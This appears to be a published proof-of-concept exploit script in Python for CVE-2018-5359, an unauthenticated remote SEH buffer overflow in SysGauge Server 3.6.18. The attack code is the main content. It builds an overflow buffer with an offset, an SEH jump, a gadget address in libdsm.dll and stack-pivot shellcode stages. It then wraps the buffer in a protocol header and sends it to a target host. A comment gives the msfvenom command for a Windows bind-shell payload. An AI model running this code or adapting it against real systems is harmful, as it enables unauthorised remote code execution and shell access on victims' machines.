# Exploit Title: SysGauge Server 3.6.18 - Buffer Overflow
# Exploit Author: Ahmad Mahfouz 
# Description: Sysgauge Server Unauthenticated Remote Buffer Overflow SEH
# Contact: http://twitter.com/eln1x
# Date: 12/01/2018
# CVE: CVE-2018-5359
# Version: 3.6.18
# Tested on: Windows 7 x64
# Software Link: hhttp://www.sysgauge.com/setups/sysgaugesrv_setup_v3.6.18.exe

 

from struct import pack
from os import system
from sys import exit
from time import sleep
import socket

from struct import pack

import time
#!/usr/bin/python

import socket
from payload import buf
def shell_attack(target_machine, target_port):
 

    port = target_port
    host = target_machine

    
    stage1 = b"\x83\xc4\x7f" *16 # metasm > add esp,127
    stage1 += b"\x83\xc4\x04"    # metasm > add esp,4
    stage1 +=  b"\xff\xe4"       # metasm > jmp esp
    # msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=1337 -f py -b '\x02'


  

    payload = b'A' * 124             #offset
    payload +=  b'\xeb\x12\x90\x90'  #jmp over seh retrun value
    payload += b'\x3b\x38\x01\x10' * 4   # 0x1001383b : pop edi # pop esi # ret 0x04 | ascii {PAGE_EXECUTE_READ} [libdsm.dll]
    payload += stage1 
    payload +=  b'\x90' * (1000 - len(payload) - len(buf))
    payload += buf

    

    header = b'\x75\x19\xba\xab'
    header += b'\x03\x00\x00\x00'
    header += b'\x00\x40\x00\x00'
    header += pack(b'<I', len(payload))
    header += pack(b'<I', len(payload))
    header += pack(b'<I', ord(payload[-1]))
    packet = header
    packet += payload 

    

    

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:

        
        s.connect((host, port))
        s.send(packet)
        s.close()


    except:

       print("Not connected")

    

  

   